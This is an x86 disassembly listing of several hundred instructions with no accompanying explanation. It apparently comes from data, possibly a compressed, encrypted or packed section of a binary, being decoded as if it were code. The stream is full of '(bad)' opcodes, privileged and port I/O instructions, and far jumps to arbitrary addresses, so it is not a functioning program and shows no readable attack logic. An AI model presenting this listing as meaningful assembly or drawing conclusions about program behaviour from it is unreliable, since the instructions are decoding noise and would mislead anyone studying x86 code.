  4051ed:	aaa    
  4051ee:	pop    ebx
  4051ef:	push   edi
  4051f0:	(bad)  
  4051f1:	or     al,0x9c
  4051f3:	push   cs
  4051f4:	(bad)  
  4051f5:	pop    esi
  4051f6:	fsub   st(5),st
  4051f8:	das    
  4051f9:	jns    0x40524f
  4051fb:	cs ss pop ecx
  4051fe:	dec    edi
  4051ff:	aas    
  405200:	imul   edx,DWORD PTR [eax-0x29],0xdac23f5
  405207:	mov    ch,0xf5
  405209:	fwait
  40520a:	or     DWORD PTR [esi-0x3f],ecx
  40520d:	repz mov edi,0x9af1313
  405213:	sbb    eax,0x7feb6fb3
  405218:	sub    DWORD PTR [esi-0x1f63e3db],ebp
  40521e:	pop    eax
  40521f:	push   esp
  405220:	ins    BYTE PTR es:[edi],dx
  405221:	shl    edx,cl
  405223:	shr    BYTE PTR [edx-0x14],1
  405226:	or     DWORD PTR [edi+ebp*4],esp
  405229:	(bad)  
  40522a:	dec    BYTE PTR [ebp-0x6bd2ea9a]
  405230:	ins    BYTE PTR es:[edi],dx
  405231:	inc    ebx
  405232:	adc    al,0xd2
  405234:	mov    BYTE PTR [ecx+edx*8+0x292daa3c],cl
  40523b:	jge    0x40523d
  40523d:	psadbw mm2,QWORD PTR [eax-0x6b6e0a6b]
  405244:	ins    DWORD PTR es:[edi],dx
  405245:	mov    es,WORD PTR [ebp+0x40]
  405248:	cmp    edx,DWORD PTR [ebp+eiz*4-0x60]
  40524c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40524d:	lahf   
  40524e:	mov    dl,0xfa
  405250:	mov    ebx,0x4ed273e8
  405255:	adc    edi,ebx
  405257:	test   BYTE PTR [eax],al
  405259:	lock daa 
  40525b:	pop    ebx
  40525c:	ror    DWORD PTR [eax-0xe],0x96
  405260:	cmp    DWORD PTR [edx-0x4d],esi
  405263:	adc    BYTE PTR [edi+0x5f26248b],cl
  405269:	cmp    al,BYTE PTR [edx+0x12c9b6a4]
  40526f:	fnstsw WORD PTR [edi-0x10]
  405272:	add    al,0xda
  405274:	push   eax
  405275:	in     al,0xc0
  405277:	rol    BYTE PTR [esi+edi*2+0x76b359ac],1
  40527e:	fmul   DWORD PTR [eax]
  405280:	retf   0x3191
  405283:	(bad)  
  405284:	scas   eax,DWORD PTR es:[edi]
  405285:	mov    eax,0xfcf41828
  40528a:	fcomp  DWORD PTR [eax-0x628a9cfa]
  405290:	push   eax
  405291:	pop    ds
  405292:	out    dx,eax
  405293:	fld    TBYTE PTR [edi+0x66]
  405296:	jge    0x4052d0
  405298:	lock push es
  40529a:	fstp   QWORD PTR [edi-0x27]
  40529d:	call   0xac6ae4cd
  4052a2:	mov    esi,0x89245aed
  4052a7:	jecxz  0x4052d1
  4052a9:	push   0xd2bf4a0d
  4052ae:	lds    ebp,FWORD PTR [eax]
  4052b0:	imul   esi,DWORD PTR [ebp+0x4e],0x6
  4052b4:	imul   DWORD PTR [ecx-0x8e78b14]
  4052ba:	hlt    
  4052bb:	mov    eax,0xd9e12d77
  4052c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052c1:	mov    esp,0xd388bc17
  4052c6:	adc    BYTE PTR [ebx],bh
  4052c8:	sti    
  4052c9:	dec    edi
  4052ca:	sbb    bl,BYTE PTR [ecx-0x27]
  4052cd:	inc    esi
  4052ce:	jg     0x40530c
  4052d0:	lock xor BYTE PTR [ebx+0x22],dl
  4052d4:	hlt    
  4052d5:	data16 ds mov cl,0x54
  4052d9:	mov    esi,0xa852a859
  4052de:	fsub   DWORD PTR [esp+eax*2+0x2]
  4052e2:	pop    ecx
  4052e3:	repnz imul ebx,esi,0x2c
  4052e7:	push   edx
  4052e8:	add    edx,DWORD PTR [edi]
  4052ea:	jmp    0x40532c
  4052ec:	leave  
  4052ed:	add    edi,DWORD PTR [ecx+eax*2]
  4052f0:	pusha  
  4052f1:	iret   
  4052f2:	push   ebx
  4052f3:	fldcw  WORD PTR [edx+0x3e44e02a]
  4052f9:	in     eax,dx
  4052fa:	nop
  4052fb:	shl    BYTE PTR [esi+0x22],0xe1
  4052ff:	test   BYTE PTR [ebx+0xa00b0b0],bl
  405305:	fdiv   DWORD PTR [edi]
  405307:	xor    ecx,DWORD PTR [eax]
  405309:	dec    ebx
  40530a:	test   BYTE PTR [esi+0x367f0eb8],ah
  405310:	imul   edi,DWORD PTR [eax+0x67],0x7b
  405314:	push   esp
  405315:	xor    DWORD PTR [eax+0x6c],eax
  405318:	push   edi
  405319:	adc    cl,BYTE PTR [ebp+0x7c9002a2]
  40531f:	mov    ch,0xdd
  405321:	push   ss
  405322:	and    BYTE PTR [edx+esi*1],ah
  405325:	icebp  
  405326:	imul   edi,DWORD PTR [edi+eiz*1+0x7edbb786],0x931ec030
  405331:	inc    ebx
  405332:	inc    esp
  405333:	(bad)  
  405334:	dec    edx
  405335:	test   edx,0x1b856576
  40533b:	pop    ss
  40533c:	or     al,0x59
  40533e:	(bad)  
  40533f:	outs   dx,BYTE PTR ds:[esi]
  405340:	enter  0x8cba,0x8b
  405344:	xor    al,0x12
  405346:	sahf   
  405347:	push   esp
  405348:	in     eax,dx
  405349:	iret   
  40534a:	popa   
  40534b:	dec    ebx
  40534c:	test   dh,0xd0
  40534f:	popf   
  405350:	ror    BYTE PTR [edx],1
  405352:	sbb    cl,ah
  405354:	adc    dl,BYTE PTR [ebp+0x5f]
  405357:	mov    BYTE PTR [edi+0x1d],dl
  40535a:	(bad)  [esi-0x8]
  40535d:	push   ebp
  40535e:	es (bad) 
  405360:	aas    
  405361:	(bad)  
  405363:	push   edx
  405364:	in     al,0x38
  405366:	adc    bl,BYTE PTR [ebp-0x34]
  405369:	mov    al,0x9c
  40536b:	rol    BYTE PTR [ebp+0x62215829],cl
  405371:	aaa    
  405372:	popf   
  405373:	scas   al,BYTE PTR es:[edi]
  405374:	fld    QWORD PTR [ecx-0x235980c1]
  40537a:	sbb    esp,ecx
  40537c:	neg    BYTE PTR [ebx-0x64]
  40537f:	pusha  
  405380:	xchg   ebp,eax
  405381:	xchg   BYTE PTR [esi],ah
  405383:	xor    edx,eax
  405385:	xor    al,0xe2
  405387:	jmp    DWORD PTR [edi+0x17]
  40538a:	mov    BYTE PTR [ebx-0x4a],cl
  40538d:	dec    ebp
  40538e:	stos   BYTE PTR es:[edi],al
  40538f:	clc    
  405390:	xchg   DWORD PTR [edi-0x7192937c],esi
  405396:	jp     0x405370
  405398:	xor    ebp,DWORD PTR [eax+0x67f7eec9]
  40539e:	retf   0x6f8c
  4053a1:	call   0x9702:0xaf331e98
  4053a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053a9:	add    bl,bh
  4053ab:	adc    al,0x70
  4053ad:	int3   
  4053ae:	rol    bh,0x45
  4053b1:	push   0xffffffff
  4053b3:	leave  
  4053b4:	cli    
  4053b5:	(bad)  
  4053b6:	std    
  4053b7:	mov    al,0xda
  4053b9:	pop    ss
  4053ba:	xchg   ecx,eax
  4053bb:	inc    ebp
  4053bc:	push   ss
  4053bd:	clc    
  4053be:	shr    DWORD PTR [edx],1
  4053c0:	je     0x4053cc
  4053c2:	mov    WORD PTR [edi+0x72],ds
  4053c5:	inc    edx
  4053c6:	mov    bl,BYTE PTR [eax]
  4053c8:	add    eax,0x83d3b23b
  4053cd:	mov    ds:0xef286e86,al
  4053d2:	pop    edx
  4053d3:	fstp   QWORD PTR [ecx]
  4053d5:	xchg   ebp,eax
  4053d6:	inc    eax
  4053d7:	pop    ebp
  4053d8:	mov    WORD PTR [eax+eiz*1],fs
  4053db:	lahf   
  4053dc:	repz stc 
  4053de:	sti    
  4053df:	or     dl,BYTE PTR [ebp-0x782c8342]
  4053e5:	add    eax,0xae4b5263
  4053ea:	xchg   ebx,eax
  4053eb:	add    eax,0x162d45ac
  4053f0:	push   esi
  4053f1:	js     0x4053a9
  4053f3:	je     0x4053da
  4053f5:	int    0xd4
  4053f7:	sub    dl,dl
  4053f9:	(bad)  
  4053fa:	fisubr DWORD PTR [esi+0xe]
  4053fd:	jb     0x4053ac
  4053ff:	xchg   ecx,eax
  405400:	adc    al,ch
  405402:	mov    al,0x37
  405404:	sar    DWORD PTR ds:0x8d4ed2ce,cl
  40540a:	ret    
  40540b:	int3   
  40540c:	call   0x7804:0x3a8fa23
  405413:	jecxz  0x4053ad
  405415:	test   eax,0x10d79252
  40541a:	loop   0x40540f
  40541c:	mov    DWORD PTR [edx-0x71],edx
  40541f:	sbb    DWORD PTR [ebp+0x0],ebp
  405422:	fisttp WORD PTR [esi-0x5ee0ba64]
  405428:	adc    al,0x19
  40542a:	loopne 0x40542b
  40542c:	test   al,0x14
  40542e:	clc    
  40542f:	mov    ch,0xda
  405431:	popa   
  405432:	mov    ecx,0x5db38bae
  405437:	cli    
  405438:	in     al,dx
  405439:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40543a:	jb     0x405446
  40543c:	(bad)  
  40543d:	in     eax,dx
  40543e:	mov    esp,0x96e42c5f
  405443:	sti    
  405444:	pop    esi
  405445:	sbb    edx,eax
  405447:	add    ah,BYTE PTR [esi+esi*2+0x67]
  40544b:	popa   
  40544c:	loopne 0x405465
  40544e:	jmp    0xfd37c807
  405453:	pop    ebp
  405454:	mov    edx,0xf86a93f2
  405459:	arpl   WORD PTR [ecx],bx
  40545b:	in     al,dx
  40545c:	lods   eax,DWORD PTR ds:[esi]
  40545d:	mov    ebp,0x46ebac39
  405462:	iret   
  405463:	or     al,0x10
  405465:	cmp    DWORD PTR [ebx+0x44],edi
  405468:	lea    esp,[esi-0x37]
  40546b:	jmp    0xea39:0x9a9fb8de
  405472:	repz adc BYTE PTR [edi-0x53f26b29],al
  405479:	mov    ecx,0x74a54d70
  40547e:	int3   
  40547f:	add    al,0x87
  405481:	cmovle esp,DWORD PTR [ebx]
  405484:	fsub   DWORD PTR ds:0xc3b0e28e
  40548a:	sub    DWORD PTR [eax+0x3ff3edd3],edx
  405490:	pop    eax
  405491:	(bad)  
  405492:	int3   
  405493:	call   0x27a7:0x27c68e87
  40549a:	xchg   edi,eax
  40549b:	fldl2t 
  40549d:	adc    esi,DWORD PTR ds:0xf3fc80d5
  4054a3:	jns    0x405445
  4054a5:	inc    edi
  4054a6:	test   eax,0xb050123
  4054ab:	dec    esi
  4054ac:	dec    ecx
  4054ad:	dec    edx
  4054ae:	mov    ebp,0x899f6ca9
  4054b3:	add    esi,esi
  4054b5:	mov    esp,0x7f7cd6d1
  4054ba:	mov    eax,0x27291127
  4054bf:	addr16 inc edx
  4054c1:	cmp    edx,DWORD PTR [ebp-0x55]
  4054c4:	adc    eax,0x44411a3d
  4054c9:	in     eax,0x0
  4054cb:	jg     0x4054fd
  4054cd:	dec    edx
  4054ce:	inc    esp
  4054cf:	push   esp
  4054d0:	pop    esi
  4054d1:	adc    ah,BYTE PTR [edi+esi*4-0x5a20c06a]
  4054d8:	ss stc 
  4054da:	adc    BYTE PTR [esi+edx*4-0x2a],dl
  4054de:	and    ebp,DWORD PTR [ecx-0x1a7467d6]
  4054e4:	lds    ecx,FWORD PTR [edx]
  4054e6:	daa    
  4054e7:	je     0x40552f
  4054e9:	xchg   ecx,eax
  4054ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054eb:	cmp    bl,BYTE PTR [esp+0x6b01a3c9]
  4054f2:	ret    
  4054f3:	loope  0x40550c
  4054f5:	test   eax,0x36a5f554
  4054fa:	adc    edi,ebx
  4054fc:	dec    esp
  4054fd:	stc    
  4054fe:	push   ebx
  4054ff:	push   esp
  405500:	fsubr  DWORD PTR [edi+0x254a82af]
  405506:	jo     0x4054d9
  405508:	ins    BYTE PTR es:[edi],dx
  405509:	sub    eax,0xe083e0b9
  40550e:	jle    0x405547
  405510:	xor    BYTE PTR [edi+0x19],ah
  405513:	jmp    0x8b8e8baa
  405518:	(bad)  
  405519:	mov    ebx,0x16b2a72
  40551e:	call   0x8e37:0x8cc3822f
  405525:	(bad)  
  405526:	sbb    eax,0xf86f984c
  40552b:	loope  0x405539
  40552d:	nop
  40552e:	mov    edi,0xb11ea717
  405533:	neg    DWORD PTR [eax]
  405535:	dec    BYTE PTR [esi-0x40f178b2]
  40553b:	mov    esi,?
  40553d:	in     al,0xc
  40553f:	inc    esp
  405540:	xor    DWORD PTR [edi-0xc],0xf10c3d0f
  405547:	js     0x4054d9
  405549:	push   ebx
  40554a:	jno    0x405521
  40554c:	pushf  
  40554d:	mov    DWORD PTR [edx],eax
  40554f:	(bad)  [edx+0x17711cb1]
  405555:	hlt    
  405556:	inc    eax
  405557:	mov    edi,0xd3725341
  40555c:	bound  esp,QWORD PTR ds:0x3ca72e43
  405562:	xchg   edi,eax
  405563:	imul   ebx,DWORD PTR [edx+0x26],0x71
  405567:	and    al,0xbe
  405569:	popa   
  40556a:	not    DWORD PTR [ecx-0x67]
  40556d:	mov    bh,0xe6
  40556f:	pop    edx
  405570:	sub    eax,0x269a206f
  405575:	out    dx,eax
  405576:	xchg   edi,eax
  405577:	sub    DWORD PTR [edi],esp
  405579:	jl     0x40552a
  40557b:	ins    BYTE PTR es:[edi],dx
  40557c:	addr16 ror edi,0xd2
  405580:	xchg   ebp,eax
  405581:	into   
  405582:	jns    0x40551c
  405584:	int    0x8b
  405586:	xchg   esp,eax
  405587:	mov    eax,ds:0xbcb1e407
  40558c:	aas    
  40558d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40558e:	or     DWORD PTR [esi-0x5c],0x7a
  405592:	mov    eax,0xa4985364
  405597:	xchg   ecx,eax
  405598:	cmp    ecx,eax
  40559a:	call   0xac38:0x5c18b544
  4055a1:	out    dx,eax
  4055a2:	clc    
  4055a3:	ins    DWORD PTR es:[edi],dx
  4055a4:	cmp    BYTE PTR [edx],al
  4055a6:	inc    edx
  4055a7:	ret    0xc5f9
  4055aa:	mov    ah,0x93
  4055ac:	lea    edi,[esi]
  4055ae:	scas   eax,DWORD PTR es:[edi]
  4055af:	cmp    dh,BYTE PTR [ecx-0x35]
  4055b2:	shr    BYTE PTR [ebp+0x21],0xcf
  4055b6:	lahf   
  4055b7:	inc    eax
  4055b8:	fcmovnbe st,st(7)
  4055ba:	pop    esp
  4055bb:	inc    edi
  4055bc:	fcomp  QWORD PTR [esi+ebp*8+0x26]
  4055c0:	ja     0x40561c
  4055c2:	scas   eax,DWORD PTR es:[edi]
  4055c3:	jge    0x405572
  4055c5:	in     al,dx
  4055c6:	lock pushf 
  4055c8:	out    0x76,eax
  4055ca:	mov    esi,0xfdbc5721
  4055cf:	sub    edi,eax
  4055d1:	std    
  4055d2:	clc    
  4055d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055d4:	jne    0x405620
  4055d6:	sub    eax,0xdca13c6
  4055db:	out    dx,eax
  4055dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055dd:	int3   
  4055de:	aas    
  4055df:	xchg   ecx,eax
  4055e0:	sbb    BYTE PTR [ecx+0x11],ch
  4055e3:	push   ebp
  4055e4:	inc    BYTE PTR [esi]
  4055e6:	dec    ebp
  4055e7:	sahf   
  4055e8:	retf   0xe959
  4055eb:	dec    edi
  4055ec:	scas   eax,DWORD PTR es:[edi]
  4055ed:	sbb    ah,BYTE PTR [edi-0x350642cf]
  4055f3:	mov    eax,0x567f94fd
  4055f8:	add    al,0x29
  4055fa:	shl    BYTE PTR [edx+eax*2+0x43bde2ae],1
  405601:	push   es
  405602:	ror    DWORD PTR [ebx+0x46],1
  405605:	(bad)  
  405606:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405607:	add    eax,0xa9dc9f93
  40560c:	add    bl,BYTE PTR [ecx-0x5]
  40560f:	in     al,dx
  405610:	ret    0x191d
  405613:	icebp  
  405614:	jl     0x4055fd
  405616:	push   edx
  405617:	xlat   BYTE PTR ds:[ebx]
  405618:	xor    ebx,DWORD PTR [edi+0x282cb0c2]
  40561e:	aas    
  40561f:	cmp    eax,0x4b9e29fa
  405624:	add    DWORD PTR [edi],ebx
  405626:	or     dh,BYTE PTR [ebx]
  405628:	mov    WORD PTR [eax-0x65],gs
  40562b:	cmp    al,0x21
  40562d:	int3   
  40562e:	icebp  
  40562f:	fldcw  WORD PTR [ebp+0xf]
  405632:	out    0xfa,al
  405634:	dec    ebp
  405635:	or     bl,BYTE PTR [ebp+0x7]
  405638:	pop    ds
  405639:	jmp    0x911d:0x7f4b8977
  405640:	loope  0x405611
  405642:	push   edx
  405643:	cwde   
  405644:	add    dh,0xea
  405647:	mov    ebp,0x11876c72
  40564c:	cdq    
  40564d:	sbb    al,0xfb
  40564f:	fidiv  DWORD PTR [edi]
  405651:	adc    eax,0x1e8f71e2
  405656:	pop    eax
  405657:	(bad)  
  405658:	js     0x40563f
  40565a:	or     ebp,esi
  40565c:	test   edi,esp
  40565e:	and    BYTE PTR [edi+ebx*4-0x1bda31ea],0xf9
  405666:	mov    ah,0x5f
  405668:	popf   
  405669:	mov    ah,0xa5
  40566b:	and    al,0xaf
  40566d:	into   
  40566e:	inc    ecx
  40566f:	xor    eax,0xc2413409
  405674:	xchg   DWORD PTR [edx+0x5960f14b],eax
  40567a:	out    0x27,al
  40567c:	mov    ah,0xd0
  40567e:	mov    ebp,0x89cd16e1
  405683:	dec    ebx
  405684:	or     BYTE PTR [ecx],0xaf
  405687:	shl    BYTE PTR [edx],1
  405689:	or     esp,DWORD PTR [ecx+0x16]
  40568c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40568d:	sub    BYTE PTR [edx],dh
  40568f:	push   edx
  405690:	sahf   
  405691:	pop    esi
  405692:	repnz inc esp
  405694:	mov    ch,BYTE PTR [esp+ecx*1-0x65ffcc8b]
  40569b:	push   ds
  40569c:	into   
  40569d:	rol    DWORD PTR [ebp-0x17],1
  4056a0:	jae    0x4056e6
  4056a2:	pop    ds
  4056a3:	sbb    eax,0x8fd8603b
  4056a8:	and    al,BYTE PTR [esi+ebp*4+0xd15e893]
  4056af:	popa   
  4056b0:	adc    al,0x66
  4056b2:	mov    ebx,0xc1d1d19c
  4056b7:	xor    eax,0x4deed010
  4056bc:	mov    esp,DWORD PTR [ecx-0x78065df0]
  4056c2:	mov    esp,0x452f754
  4056c7:	cmp    BYTE PTR [ecx],bl
  4056c9:	mov    bh,0x48
  4056cb:	loopne 0x40572a
  4056cd:	pop    ds
  4056ce:	jb     0x4056c0
  4056d0:	outs   dx,DWORD PTR ds:[esi]
  4056d1:	lds    ebp,FWORD PTR [esi-0x2ad2d1aa]
  4056d7:	dec    edx
  4056d8:	mov    eax,0xaf76f086
  4056dd:	fnstsw WORD PTR [esi]
  4056df:	mov    ebp,0x1969a773
  4056e4:	aaa    
  4056e5:	ss mov ecx,0xa03eb5de
  4056eb:	mov    DWORD PTR [eax-0x35],0xe6944c5e
  4056f2:	popa   
  4056f3:	sbb    eax,0x8eda5541
  4056f8:	data16 adc ch,bh
  4056fb:	push   ebp
  4056fc:	gs in  al,dx
  4056fe:	cli    
  4056ff:	in     al,dx
  405700:	leave  
  405701:	inc    ecx
  405702:	dec    ecx
  405703:	sbb    al,bl
  405705:	mov    esi,0xfb559731
  40570a:	je     0x4056be
  40570c:	mov    al,ds:0x592107ec
  405711:	jecxz  0x4056e2
  405713:	bound  esp,QWORD PTR cs:[esi-0x2a912777]
  40571a:	not    DWORD PTR ds:0xe5daa27e
  405720:	pop    es
  405721:	lock jl 0x40571b
  405724:	aas    
  405725:	dec    esp
  405726:	lahf   
  405727:	out    0x76,eax
  405729:	test   BYTE PTR [esp+ebp*1-0x3],bl
  40572d:	es sbb eax,0x6ace787f
  405733:	aas    
  405734:	daa    
  405735:	stos   BYTE PTR es:[edi],al
  405736:	stos   BYTE PTR es:[edi],al
  405737:	mov    ecx,0xd287f13f
  40573c:	daa    
  40573d:	test   ah,bh
  40573f:	not    DWORD PTR [ecx+edi*1-0x5ee943f1]
  405746:	or     DWORD PTR ds:0x799efa8c,0xc3189369
  405750:	jge    0x40579c
  405752:	jle    0x40577c
  405754:	sbb    ecx,esp
  405756:	cmp    eax,DWORD PTR [ecx-0x2e]
  405759:	sub    eax,0x30e4427f
  40575e:	arpl   WORD PTR [edx-0x21a4069c],dx
  405764:	enter  0x8778,0x43
  405768:	xchg   ecx,eax
  405769:	add    BYTE PTR [edi+0x17],cl
  40576c:	xchg   ecx,eax
  40576d:	xchg   BYTE PTR [eax],bl
  40576f:	ret    0x64bd
  405772:	adc    al,0x9a
  405774:	clc    
  405775:	stc    
  405776:	push   eax
  405777:	or     al,0x6a
  405779:	mov    ah,0x95
  40577b:	pop    ds
  40577c:	cmp    al,0x5
  40577e:	push   edx
  40577f:	in     eax,0xbd
  405781:	pushf  
  405782:	and    dh,bh
  405784:	inc    eax
  405785:	jae    0x405711
  405787:	inc    ebp
  405788:	out    dx,al
  405789:	mov    bh,0xc7
  40578b:	pop    ebp
  40578c:	jae    0x40572c
  40578e:	mov    BYTE PTR [eax+0x5df05710],ah
  405794:	cmp    BYTE PTR [esi-0x6],0x65
  405798:	dec    ebx
  405799:	dec    esp
  40579a:	sbb    DWORD PTR [ecx+0x7ffccd41],0x76
  4057a1:	push   ss
  4057a2:	int3   
  4057a3:	push   esi
  4057a4:	div    DWORD PTR [ebx+0xb86d6c]
  4057aa:	loope  0x40580b
  4057ac:	ds stos BYTE PTR es:[edi],al
  4057ae:	leave  
  4057af:	nop
  4057b0:	aaa    
  4057b1:	dec    ebx
  4057b2:	out    0xd2,al
  4057b4:	int3   
  4057b5:	push   edx
  4057b6:	ins    DWORD PTR es:[edi],dx
  4057b7:	push   es
  4057b8:	mov    eax,ds:0x1a91432f
  4057bd:	mov    esp,0xeaef5794
  4057c2:	mov    WORD PTR [ebx+0x3e],?
  4057c5:	in     eax,dx
  4057c6:	jp     0x40578f
  4057c8:	mov    ds:0xf754c2f2,eax
  4057cd:	or     DWORD PTR [ebp-0x5adcff30],esi
  4057d3:	xchg   esi,eax
  4057d4:	fldcw  WORD PTR [eax+0x272d889d]
  4057da:	in     al,dx
  4057db:	rcl    DWORD PTR [ecx+ebp*1+0x178db775],1
  4057e2:	cmp    dl,BYTE PTR [ecx-0x18]
  4057e5:	cmp    dh,BYTE PTR [edi+0x28]
  4057e8:	aas    
  4057e9:	mov    edx,0xca3e0033
  4057ee:	aaa    
  4057ef:	push   ds
  4057f0:	lahf   
  4057f1:	and    eax,0x5dc42328
  4057f6:	(bad)  
  4057f7:	jns    0x4057f3
  4057f9:	jbe    0x4057ae
  4057fb:	lods   eax,DWORD PTR ds:[esi]
  4057fc:	div    BYTE PTR ds:0x7156d943
  405802:	sbb    DWORD PTR [ecx-0x4c],0xcc12a528
  405809:	loop   0x40578b
  40580b:	sub    eax,0xf0b11bca
  405810:	inc    ebp
  405811:	test   eax,0xe3e8242a
  405816:	inc    ebx
  405817:	in     al,0xe2
  405819:	mov    dl,0xe3
  40581b:	(bad)  
  40581c:	pop    esp
  40581d:	pop    ebp
  40581e:	xchg   esp,eax
  40581f:	les    edx,FWORD PTR [edi+0x74d853e3]
  405825:	inc    eax
  405826:	jmp    0x7a33:0xf858678a
  40582d:	inc    ebp
  40582e:	fdivr  DWORD PTR [edx-0x4f]
  405831:	lods   eax,DWORD PTR ds:[esi]
  405832:	test   BYTE PTR [ecx],ch
  405834:	fistp  WORD PTR [esi-0x22]
  405837:	cdq    
  405838:	and    al,0xd5
  40583a:	(bad)  
  40583b:	or     eax,0x31614007
  405840:	cmp    al,BYTE PTR [ecx+0x9]
  405843:	ficomp DWORD PTR [eax-0x4e]
  405846:	mov    edx,0x4c02aec1
  40584b:	pop    esp
  40584c:	(bad)  
  40584e:	mov    cl,0x64
  405850:	jp     0x4058d0
  405852:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405853:	push   ecx
  405854:	retf   0xb9ab
  405857:	mov    al,0xa5
  405859:	push   esp
  40585a:	dec    edi
  40585b:	jl     0x405827
  40585d:	jbe    0x405864
  40585f:	outs   dx,BYTE PTR ds:[esi]
  405860:	into   
  405861:	enter  0xc4e4,0x87
  405865:	push   esp
  405866:	jbe    0x4057ed
  405868:	cwde   
  405869:	mov    cl,0xb5
  40586b:	into   
  40586c:	repz xor ecx,ebp
  40586f:	fs push 0x2d
  405872:	add    eax,0x946282ae
  405877:	mov    bl,0x29
  405879:	enter  0xd5e0,0xcb
  40587d:	shl    BYTE PTR [esi],cl
  40587f:	mov    ah,0x4c
  405881:	cmp    dl,BYTE PTR [bx-0x6a]
  405885:	jg     0x405864
  405887:	add    ch,BYTE PTR [edi+0x50f18a58]
  40588d:	mov    DWORD PTR [eax-0x6d308eab],0xdb91dcd2
  405897:	popa   
  405898:	inc    edi
  405899:	inc    esi
  40589a:	in     al,dx
  40589b:	adc    cl,BYTE PTR [ecx-0x5db4e993]
  4058a1:	mov    DWORD PTR [ebx],ebx
  4058a3:	arpl   WORD PTR [ebx-0x513b0ed],cx
  4058a9:	out    dx,al
  4058aa:	loop   0x4058ef
  4058ac:	jnp    0x405836
  4058ae:	xchg   ecx,eax
  4058af:	dec    edx
  4058b0:	sar    BYTE PTR [edi+0x7e],cl
  4058b3:	pop    esi
  4058b4:	sbb    BYTE PTR [eax-0x6b],0xe7
  4058b8:	in     eax,0x11
  4058ba:	jecxz  0x4058e5
  4058bc:	or     bl,cl
  4058be:	and    DWORD PTR [esi],ecx
  4058c0:	sahf   
  4058c1:	sbb    ch,BYTE PTR [ebx-0x6fc117af]
  4058c7:	(bad)  [esp+ebx*2]
  4058ca:	imul   edx,ecx,0xffffff89
  4058cd:	dec    ebx
  4058ce:	cmp    ah,BYTE PTR [eax+0x3d]
  4058d1:	push   ss
  4058d2:	xchg   edx,eax
  4058d3:	pop    ds
  4058d4:	out    dx,al
  4058d5:	(bad)  
  4058d7:	jmp    0xa11:0x267b65e3
  4058de:	inc    esi
  4058df:	and    al,BYTE PTR [ebx-0x56283df9]
  4058e5:	jle    0x405895
  4058e7:	sbb    ebp,DWORD PTR [esi+eiz*4+0x59981f10]
  4058ee:	adc    edi,ebp
  4058f0:	add    eax,0xa05401d8
  4058f5:	out    0x10,eax
  4058f7:	call   0x2cbaefa5
  4058fc:	jmp    0x6e8d8b9
  405901:	stos   DWORD PTR es:[edi],eax
  405902:	xchg   ecx,eax
  405903:	or     BYTE PTR [ecx+0x15de16fe],bl
  405909:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40590a:	repz das 
  40590c:	and    BYTE PTR [ebx+0xf],dh
  40590f:	xor    al,0x7b
  405911:	add    eax,ecx
  405913:	test   al,0x98
  405915:	add    ch,BYTE PTR [edx]
  405917:	in     eax,0xc2
  405919:	push   esi
  40591a:	xchg   ecx,eax
  40591b:	mov    WORD PTR [esi+0x44],cs
  40591e:	ins    DWORD PTR es:[edi],dx
  40591f:	test   al,0x2b
  405921:	daa    
  405922:	fsubr  QWORD PTR [esi+0x5bce38d8]
  405928:	or     al,0xb7
  40592a:	jnp    0x405944
  40592c:	push   esp
  40592d:	not    dh
  40592f:	cmc    
  405930:	ret    
  405931:	bound  ecx,QWORD PTR [esi-0x35b815a6]
  405937:	xlat   BYTE PTR ds:[ebx]
  405938:	imul   eax,DWORD PTR [eax-0x42],0x7e
  40593c:	cdq    
  40593d:	fdiv   st(5),st
  40593f:	imul   edi,DWORD PTR [ebp-0x24],0xfb742d15
  405946:	push   ds
  405947:	jnp    0x405977
  405949:	nop
  40594a:	xor    DWORD PTR [edx+0x732b43d3],esi
  405950:	pop    bp
  405952:	loopne 0x405980
  405954:	popa   
  405955:	push   esi
  405956:	mov    WORD PTR [esi+0x26],ds
  405959:	int    0x34
  40595b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40595c:	push   ds
  40595d:	pop    edx
  40595e:	mov    dh,0xe4
  405960:	arpl   cx,ax
  405962:	sbb    DWORD PTR [ebx+edx*2+0x27cfe7fb],esi
  405969:	in     al,0x73
  40596b:	fld    QWORD PTR [ebx+0x32]
  40596e:	push   ebx
  40596f:	xor    al,0x93
  405971:	outs   dx,DWORD PTR ds:[esi]
  405972:	in     al,dx
  405973:	test   DWORD PTR [edi-0x2ebddaef],esp
  405979:	and    eax,0x52ad1e0b
  40597e:	jg     0x40598d
  405980:	pop    ds
  405981:	cwde   
  405982:	xchg   ebx,eax
  405983:	test   BYTE PTR [edx+0x37272083],cl
  405989:	stos   BYTE PTR es:[edi],al
  40598a:	ins    BYTE PTR es:[edi],dx
  40598b:	cmp    BYTE PTR [edx+ebx*1+0x36],al
  40598f:	mov    DWORD PTR [ecx+edi*8],edx
  405992:	pop    DWORD PTR [ecx-0x7c]
  405995:	stos   DWORD PTR es:[edi],eax
  405996:	xor    dl,BYTE PTR [ecx]
  405998:	in     al,dx
  405999:	call   0xe77a92a8
  40599e:	shl    BYTE PTR [eiz*2-0x5b23a3bd],0x9b
  4059a6:	mov    bh,BYTE PTR [edi+0x6734baaf]
  4059ac:	mov    bh,0x8e
  4059ae:	pop    esi
  4059af:	out    dx,al
  4059b0:	outs   dx,BYTE PTR ds:[esi]
  4059b1:	pop    eax
  4059b2:	or     al,0xd8
  4059b4:	nop
  4059b5:	cmp    eax,0xef9a46c9
  4059ba:	xor    al,cl
  4059bc:	dec    edi
  4059bd:	jae    0x405950
  4059bf:	jae    0x405987
  4059c1:	push   ebx
  4059c2:	add    al,0x71
  4059c4:	sahf   
  4059c5:	js     0x405a3e
  4059c7:	dec    ebx
  4059c8:	xchg   esp,eax
  4059c9:	loop   0x405988
  4059cb:	sub    edi,ebx
  4059cd:	inc    ebp
  4059ce:	xchg   ebx,eax
  4059cf:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059d1:	dec    edx
